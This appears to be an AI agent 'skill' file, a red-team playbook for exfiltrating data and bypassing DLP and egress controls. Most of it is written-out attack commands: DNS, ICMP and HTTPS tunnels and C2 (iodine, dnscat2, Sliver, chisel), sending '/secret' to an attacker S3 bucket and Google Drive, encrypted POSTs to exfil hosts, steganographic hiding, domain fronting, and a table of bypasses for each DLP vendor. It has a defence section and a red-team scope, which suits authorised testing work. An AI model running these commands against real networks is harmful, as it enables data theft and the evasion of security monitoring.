---
name: data-exfiltration-attack
description: Attacks for exfiltrating data from compromised networks and bypassing DLP/egress controls. Covers DNS tunneling, ICMP/HTTPS tunneling, protocol smuggling, steganographic exfil, cloud-native exfil (S3/OpenSearch/BigQuery), and DLP bypass. Use when testing egress monitoring, validating DLP controls, or simulating APT exfiltration campaigns.
origin: kali-claw
version: 0.1.42
compatibility:
  - kali-linux-2025-2-arm64
  - python-3.11+
  - dnscat2
  - iodine
  - chisel
  - merlin
  - sliver
allowed-tools:
  - dnscat2
  - iodine
  - dns2tcp
  - chisel
  - merlin
  - sliver
  - gost
  - ngrok
  - cloudflared
  - stunnel
  - socat
  - proxychains
  - tor
  - steghide
  - zsteg
  - powershell
  - certutil
  - bitsadmin
  - curl
  - python3
metadata:
  domain: data-exfiltration
  tool_count: 19
  guide_count: 2
  mitre: "TA0010-Exfiltration, TA0011-Command and Control, T1041, T1048, T1048.002, T1053, T1071, T1071.001, T1071.004, T1090, T1104, T1132, T1567, T1567.002, T1571, T1572, T1573"
---

# Data Exfiltration Attack

## Summary

Exfiltration is the final stage of the kill chain — once attackers have collected data, they must move it out without tripping DLP, IDS/IPS, SWG, or CASB controls. This domain covers the full exfiltration landscape: DNS tunneling (the most common C2/exfil channel in restricted environments), ICMP/HTTP(S) tunneling, protocol smuggling over legitimate services (Google Drive / OneDrive / GitHub / Cloudflare), steganographic exfiltration (PNG/BMP/PDF steg), cloud-native exfil (S3 cross-account, OpenSearch collection, BigQuery external tables), and DLP bypass techniques. Includes operator playbooks for egress testing, DLP validation, and APT exfiltration simulation against enterprise defenses (Zscaler/Netskope/Forcepoint/Palo Alto).

## Key Terms

- **Exfiltration** — Unauthorized transfer of data out of a network (MITRE TA0010)
- **C2 / Command and Control** — Channel attacker uses to control compromised host (TA0011)
- **DNS tunneling** — Encoding IP/TCP traffic inside DNS queries (iodine, dnscat2)
- **Domain fronting** — Using legitimate CDN SNI to hide attacker origin (T1090.004)
- **DLP** — Data Loss Prevention (content-aware egress filter)
- **SWG** — Secure Web Gateway (URL + content filtering for HTTP/HTTPS)
- **CASB** — Cloud Access Security Broker (cloud-aware DLP)
- **LOLBin** — Living Off The Land Binary (signed Microsoft binaries used for exfil)
- **Dead-drop resolver** — Public service (GitHub, Telegram) used as C2 polling point
- **Low-and-slow** — Exfil cadence kept below detection baseline (1–10 MB/day)
- **Double extortion** — Exfil + ransomware pattern (Conti, LockBit, BlackCat)
- **Air-gap exfil** — Out-of-band channels (acoustic, EM, LED) for isolated networks

## Scope

This skill covers **offensive exfiltration testing** for red team engagements:
- Egress validation against DLP / SWG / CASB
- DNS / ICMP / HTTPS / stego / cloud exfil channels
- APT simulation (state actor + cybercrime tradecraft)
- DLP rule validation
- Reporting on detection gaps

**Out of scope**: data theft (real PII), destructive wipers, mass DoS of egress, production source-of-truth corruption.

## Use Cases

- **Egress validation**: Test whether SWG/CASB catches DNS tunneling, HTTPS beaconing, low-and-slow exfil
- **DLP rule testing**: Validate DLP catches PAN, SSN, MRN, source code, design docs across channels
- **APT simulation**: Mimic APT41 / SolarWinds / Emotet / Conti exfiltration patterns
- **DNS tunnel C2**: Operate C2 in DNS-only environments (captive portals, segmented OT)
- **Cloud exfil**: Abuse legitimate cloud services (S3 / BigQuery / OpenSearch) for stealth exfil
- **Stego exfil**: Hide payload in PNG/BMP/PDF/WAV metadata for covert channel
- **Protocol smuggling**: Disguise exfil as legitimate traffic (NTP, SCTP, WebSocket, gRPC)
- **Dead-drop resolvers**: Use public services (GitHub, Reddit, Pastebin, Telegram) for C2 polling
- **ICMP tunneling**: Operate in ICMP-only environments (some firewall configs allow ICMP only)
- **Domain fronting**: Hide exfil destination behind CDN front (Cloudflare, Fastly, Akamai)

## Core Tools

| Tool | Purpose |
|------|---------|
| `dnscat2` | DNS tunnel C2 + exfil |
| `iodine` | DNS tunnel (IP-over-DNS) |
| `dns2tcp` | DNS tunnel (TCP-over-DNS) |
| `chisel` | HTTP/WebSocket tunnel with mTLS |
| `merlin` | HTTP/2 C2 (Go) |
| `sliver` | HTTP/HTTPS/DNS C2 |
| `gost` | Multi-protocol tunnel (SOCKS/HTTP/TLS) |
| `ngrok` | Egress tunnel for testing |
| `cloudflared` | Cloudflare tunnel |
| `stunnel` | TLS wrapper |
| `socat` | Universal socket relay |
| `proxychains` | SOCKS chain |
| `tor` | Onion routing |
| `steghide` | Image/audio steganography |
| `zsteg` | PNG/BMP steganography detection |
| `powershell` | LOLBin for encoded commands |
| `certutil` | Windows LOLBin (base64 decode, download) |
| `bitsadmin` | Windows BITS for low-and-slow exfil |
| `curl` | Universal HTTP client |

## Methodology

### Phase 1 — Reconnaissance

Map the egress surface: what protocols are allowed, where DLP sits, what cloud services are reachable.

```bash
# Test outbound protocols
for proto in 53/udp 53/tcp 80/tcp 443/tcp 123/udp 4444/tcp 8080/tcp; do
  nc -vz -w 2 exit-proxy.example.com ${proto/\/*/} -p ${proto/*\//} 2>&1 | grep -E "succeeded|failed"
done

# Check DNS egress (most permissive)
dig +short AAAA exfil.example.com @internal-dns.example.com

# Identify DLP/SWG/CASB in path
curl -s https://egress-check.example.com/ | grep -iE "zscaler|netskope|forcepoint|paloalto|cisco|symantec"
```

### Phase 2 — Channel Selection

Pick exfil channel based on egress surface:

| Channel | When to use |
|---------|-------------|
| DNS tunnel | Only DNS egress allowed (captive portal, OT network) |
| HTTPS beacon | HTTPS egress allowed, want to blend with normal traffic |
| ICMP tunnel | ICMP allowed, TCP heavily monitored |
| Steganography | Image/file upload permitted, want plausible deniability |
| Cloud service | Google Drive / OneDrive reachable, want "legitimate" exfil |
| Protocol smuggling | Want to disguise as NTP/SCTP/WebSocket |

### Phase 3 — Payload Preparation

Stage data for exfil — chunk, compress, encrypt, encode.

```bash
# Stage + chunk
split -b 1024 secret.tar.gz chunk_

# Compress + encrypt
tar czf - /secret | openssl enc -aes-256-cbc -k "$KEY" -out exfil.enc

# Base64 encode for text channel
base64 -w0 exfil.enc > exfil.b64
```

### Phase 4 — DNS Tunneling

```bash
# iodine server (attacker-controlled NS)
iodined -c -f -P REPLACE_WITH_YOUR_PW 172.16.0.1 t1.exfil.example.com

# iodine client (victim)
iodine -P REPLACE_WITH_YOUR_PW t1.exfil.example.com
# Now TUN device up, can SSH/SCP over DNS

# dnscat2 (more stealthy, supports C2)
ruby dnscat2.rb exfil.example.com

# Client
./dnscat2 exfil.example.com
```

### Phase 5 — HTTPS C2/Exfil

```bash
# Sliver HTTPS implant
sliver > https --domain legit-looking.example.com --tls-cert fake.crt

# Chisel reverse tunnel (mTLS)
chisel server -p 8080 --reverse --tls-key server.key --tls-cert server.crt
chisel client https://chisel.example.com:8080 R:1080:socks

# Merlin HTTP/2
merlin > set URL https://cdn.example.com/
```

### Phase 6 — ICMP Tunneling

```bash
# Hans (ICMP tunnel)
hans -v -f -s 1 -p REPLACE_WITH_YOUR_PW 10.0.0.1   # server
hans -v -f -c -p REPLACE_WITH_YOUR_PW 10.0.0.1     # client

# Ptunnel (ICMP tunnel via ping)
ptunnel -r exfil.example.com -lp 8000
```

### Phase 7 — Steganographic Exfil

```bash
# Embed payload in PNG
steghide embed -cf cover.png -ef exfil.enc -p REPLACE_WITH_YOUR_PW -sf stego.png

# Embed in WAV
steghide embed -cf cover.wav -ef exfil.enc -p REPLACE_WITH_YOUR_PW -sf stego.wav

# PDF stego (metadata + JavaScript payload)
exiftool -Comment="$(base64 exfil.enc)" cover.pdf -o stego.pdf
```

### Phase 8 — Cloud Service Abuse

```bash
# Exfil via legitimate cloud service
# Google Drive
rclone copy /secret gdrive:exfil/

# AWS S3 cross-account
aws s3 sync /secret s3://attacker-bucket/ --endpoint-url https://s3.amazonaws.com

# GitHub gist
curl -X POST -H "Authorization: token $GH_PAT" \
  https://api.github.com/gists -d @gist-payload.json

# Cloudflare R2
aws s3 sync /secret s3://exfil/ --endpoint-url https://abc.r2.cloudflarestorage.com
```

### Phase 9 — Domain Fronting

```bash
# Domain fronting via Cloudflare
curl -H "Host: hidden-c2.example.com" \
     https://legitimate-cdn-hosted-on-cloudflare.com/

# Domain fronting via AWS CloudFront
curl -H "Host: hidden-c2.example.com" \
     https://d111111abcdef8.cloudfront.net/
```

### Phase 10 — Reporting

Produce exfil validation report:
- Channels tested (which succeeded / failed)
- Volume exfil'd per channel
- DLP/SWG alerts triggered (or not)
- Detection gaps

## Practical Steps

### Step 1 — Map egress surface

```bash
# Identify allowed outbound
for port in 53 80 443 123 445 3306 3389 5432 5900 8080 8443; do
  timeout 2 nc -vz exit-proxy.example.com $port 2>&1 | grep -E "succeeded" && echo "Port $port OPEN"
done

# Test DNS recursion
dig +short AAAA exfil.attacker.example.com @internal-dns.example.com
```

### Step 2 — Test DNS tunnel

```bash
# Set up attacker NS (skip this in lab)
# Run iodine client on victim
iodine -P REPLACE_WITH_YOUR_PW t1.exfil.example.com
# Verify TUN device
ip addr show dns0
# Now SSH over DNS
ssh user@172.16.0.1
```

### Step 3 — Test HTTPS C2

```bash
# Sliver implant
sliver > generate --http https://c2.example.com --os linux
sliver > http
# Implant beacons out, exfil via HTTP POST

# Beaconing simulation
while read chunk; do
  curl -X POST https://c2.example.com/upload -d "$chunk"
done < chunks.txt
```

### Step 4 — Test stego exfil

```bash
# Generate cover image
ffmpeg -f lavfi -i color=black:s=1920x1080:d=1 cover.png

# Embed
steghide embed -cf cover.png -ef secret.enc -p REPLACE_WITH_YOUR_PW -sf stego.png

# Verify extraction works
steghide extract -sf stego.png -p REPLACE_WITH_YOUR_PW
```

### Step 5 — Test DLP bypass

```bash
# Generate synthetic PII (for testing DLP rules)
python3 -c "
import random
for _ in range(100):
  print(f'{random.randint(100000000, 999999999):09d}')  # SSN-like
" > fake-ssn.txt

# Try exfil raw (should be caught)
curl -X POST https://exfil.example.com/ -d @fake-ssn.txt

# Try exfil encoded (test if DLP decodes)
base64 fake-ssn.txt | curl -X POST https://exfil.example.com/ -d @-

# Try exfil encrypted (DLP can't see)
openssl enc -aes-256-cbc -k "$KEY" -in fake-ssn.txt | curl -X POST https://exfil.example.com/ -d @-
```

## Defense Perspective

Defenders must assume:

1. **DNS is a C2 channel** — most DLP ignores DNS; APTs exploit this
2. **Cloud services are dual-use** — Google Drive / GitHub gists / Pastebin are exfil vectors
3. **TLS inspection has blind spots** — pinned apps, certificate-bound, DoH/DoQ bypass SWG
4. **Volume-based detection misses low-and-slow** — rate-based detection misses patient exfil
5. **Stego is hard to detect at scale** — but can flag anomalies (image entropy, metadata size)
6. **ICMP is overlooked** — many networks allow ICMP; few inspect payload
7. **Domain fronting breaks destination-based detection** — must inspect SNI vs Host header
8. **LOLBins bypass allowlist** — certutil, bitsadmin, mshta are signed Microsoft binaries

Key defensive controls:

- DNS firewalling (block known-tunneled NS, monitor TXT query volume)
- TLS inspection with CFW (Cloudflare Workers), but respect cert pinning
- Cloud service allowlist + monitoring (Google Workspace / M365 audit logs)
- Steganography detection (entropy analysis, metadata size limits)
- Domain fronting detection (SNI ≠ Host header alert)
- LOLBin monitoring (certutil / bitsadmin / mshta telemetry)
- Behavior-based detection (volume baseline + peer-group anomaly)
- Decoy documents (canarytokens) to detect exfil channel
- Egress allowlist (no direct Internet, force proxy)

## References

- MITRE ATT&CK Exfiltration Tactics — https://attack.mitre.org/tactics/TA0010/
- MITRE ATT&CK Command and Control — https://attack.mitre.org/tactics/TA0011/
- CISA AA21-148A — DarkSide Ransomware (exfil techniques)
- Mandiant APT1 Report (DNS tunneling exfil)
- CrowdStrike 2024 Global Threat Report
- Google TAG — APT41 DNS Tunneling
- SolarWinds SUNBURST Analysis (FireEye, 2020)
- "Network Security Assessment" (McNutt, 2024)
- "Security Engineering" (Anderson, 3rd Edition)
- DNS Tunneling Detection — https://github.com/bsidessf/dns-tunneling-detect
- OWASP Egress Testing Guide
- IETF RFC 7858 — DNS over TLS
- IETF RFC 8484 — DNS over HTTPS
- SANS ICS — Egress monitoring for OT networks

## Channel Selection Matrix

| Egress allowed | Primary channel | Fallback channel | Volume target |
|----------------|-----------------|------------------|---------------|
| DNS only | iodine / dnscat2 | DoH (8.8.8.8) | <100 MB/day |
| DNS + HTTPS | Sliver HTTPS | DNS backup | 100 MB–1 GB |
| ICMP only | Hans / ptunnel | — | <50 MB/day |
| All TCP | Sliver + chisel | MegaSync | Unlimited |
| Cloud SaaS allowed | Google Drive / GitHub | MegaSync | Unlimited |
| Air-gapped | Acoustic / EM | LED / power-line | <10 KB/s |

## MITRE ATT&CK Mapping

| Technique | ID | Channel |
|-----------|----|---------|
| Exfiltration over C2 channel | T1041 | HTTPS / DNS |
| Exfiltration over alternative protocol | T1048 | DNS / ICMP |
| Exfiltration over asymmetric encryption | T1048.002 | HTTPS |
| Exfil via scheduled task | T1053 | certutil / bitsadmin |
| Application layer protocol — web | T1071.001 | HTTPS |
| Application layer protocol — DNS | T1071.004 | DNS |
| Proxy (CDN domain fronting) | T1090 | Cloudflare / Fastly |
| Multi-Stage Channels | T1104 | DNS → HTTPS |
| Data encoding / transformation | T1132 | base64 / stego |
| Exfiltration to cloud storage | T1567.002 | S3 / Drive |
| Non-standard port | T1571 | 8443 / 8444 |
| Protocol tunneling | T1572 | iodine / chisel |
| Encrypted channel | T1573 | TLS / mTLS |

## Engagement Workflow

1. **Scope** — confirm egress channels, DLP vendor, allowed volume cap
2. **Recon** — map egress surface (DNS / HTTPS / ICMP / cloud SaaS)
3. **Channel select** — match channel to egress + DLP visibility
4. **Lab** — build C2 infrastructure, steg tools, synthetic PII
5. **Attack** — payload prep → channel test → DLP bypass
6. **Cleanup** — remove implants, rotate infrastructure
7. **Report** — channels tested, volume exfil'd, DLP alerts triggered

## DLP Vendor Cheat Sheet

| Vendor | Detection method | Common bypass |
|--------|------------------|---------------|
| Zscaler ZIA | SNI + content regex + TLS inspection | DoH / DoT / cert pinning |
| Netskope | CASB cloud-aware | Encrypt before upload |
| Forcepoint | Content + behavior | Steganography (entropy not flagged) |
| Palo Alto | App-ID + URL filter | Domain fronting |
| Symantec DLP | Endpoint content agent | Encode / encrypt on host |
| Cisco Umbrella | DNS reputation | dGA domains |
| Bluecoat | Content + reputation | LOLBin + legitimate cloud |

## Volume Budget Guidelines

| Engagement type | Daily volume cap | Per-channel |
|-----------------|------------------|-------------|
| State actor sim (APT29) | 1–10 MB/day | DNS + HTTPS split |
| Cybercrime sim (Conti) | 100 GB/day (with approval) | HTTPS primary |
| OT network test | <1 MB/day | DNS TXT only |
| Cloud exfil test | 1–10 GB / SaaS account | S3 / Drive |
| Air-gapped test | <10 KB/s | Acoustic / EM |

## Threat Actor Profiles

| Actor | Type | Preferred channels | Volume profile |
|-------|------|-------------------|----------------|
| APT29 / NOBELIUM | State (Russia) | Domain fronting + OAuth | <100 MB/day |
| APT41 / BARIUM | State (China) | DNS tunneling | <10 MB/day |
| UNC5537 | Cybercrime | Snowflake API abuse | 100s of GB |
| Conti / LockBit | Cybercrime | Rclone / StealBit | 100 GB–6 TB |
| BlackCat / ALPHV | Cybercrime | MegaSync | 1–6 TB |
| DarkSide | Cybercrime | Rclone to S3 | 100–700 GB |
| Emotet / TrickBot | Cybercrime | HTTPS POST + DNS | <10 KB/beacon |

## Detection Coverage Map

| Technique | Detection method | Vendor |
|-----------|------------------|--------|
| DNS tunneling | TXT entropy + NS rate | Corelight, ExtraHop |
| High-volume HTTPS exfil | Egress baseline + rate | Palo Alto, Cisco |
| Domain fronting | SNI ≠ Host header | Bluecoat, F5 |
| Rclone invocation | EDR binary alert | CrowdStrike, Defender |
| OAuth token abuse | SaaS anomaly | Microsoft Defender for Cloud |
| Steganography | Image entropy analysis | FireEye, FireEye HX |
| OT exfil | DNS TXT anomaly on OT | Dragitt, Nozomi |

## Compliance Context

- **PCI DSS 3.4.1** — PAN data must be unreadable during transmission (DLP required)
- **HIPAA Security Rule** — PHI egress monitoring (CASB recommended)
- **GDPR Article 32** — encryption + DLP for personal data
- **SOC 2 Type II** — CC6.7 transmission controls
- **ISO 27001:2022** — A.13.1 network controls + A.13.2 information transfer
- **NIST 800-53 Rev 5** — SC-8 transmission confidentiality + AC-3 enforcement
- **NYDFS 500.15** — covered entity exfiltration detection
- **SEC Rule 10-12B (2024)** — 4-day breach disclosure

## Lab Infrastructure

```bash
# Bind9 (DNS lab)
sudo apt install bind9

# iodine server (NS)
iodined -c -f -P REPLACE_WITH_YOUR_PW 172.16.0.1 t1.exfil.example.com

# Sliver C2
curl https://sliver.sh/install | sudo bash

# steghide
sudo apt install steghide

# Rclone (cloud exfil)
curl https://rclone.org/install.sh | sudo bash
```

## Quality Checklist

- [ ] All in-scope channels tested (DNS / HTTPS / ICMP / stego / cloud)
- [ ] DLP / SWG vendor identified
- [ ] Volume exfil'd documented per channel
- [ ] DLP alerts triggered (or not — explain why)
- [ ] Detection rules authored for ≥3 gaps
- [ ] Synthetic PII used (no real customer data)
- [ ] Cleanup performed
- [ ] Customer debrief scheduled
- [ ] Final report delivered
- [ ] SOC handoff completed

